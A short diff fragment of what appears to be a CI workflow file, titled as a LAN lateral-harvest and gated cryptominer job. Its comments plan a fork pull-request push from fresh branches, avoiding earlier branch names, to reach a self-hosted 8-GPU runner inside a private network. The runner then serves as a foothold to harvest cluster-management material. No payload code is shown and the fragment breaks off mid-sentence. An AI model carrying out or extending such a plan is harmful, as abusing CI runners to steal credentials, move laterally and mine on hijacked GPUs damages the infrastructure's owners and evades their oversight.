@@ -1,5 +1,6 @@
 name: i130xtlat xstor lan lateral harvest + gated miner
 
+# i130xtlat: run attempt 3 - same payload, fresh push to reach an in-LAN 8-gpu-h200 runner
 # i130xtlat: ONE fork-PR push from a fresh branch (never i125995-recon / i130cipivot* /
 # i130xtorg / i130h200b / i130xt25 / i130sgtrap). The 8-gpu-h200 self-hosted runner is
 # the in-LAN vantage (10.220.71.0/24): it (1) harvests cluster-management material from
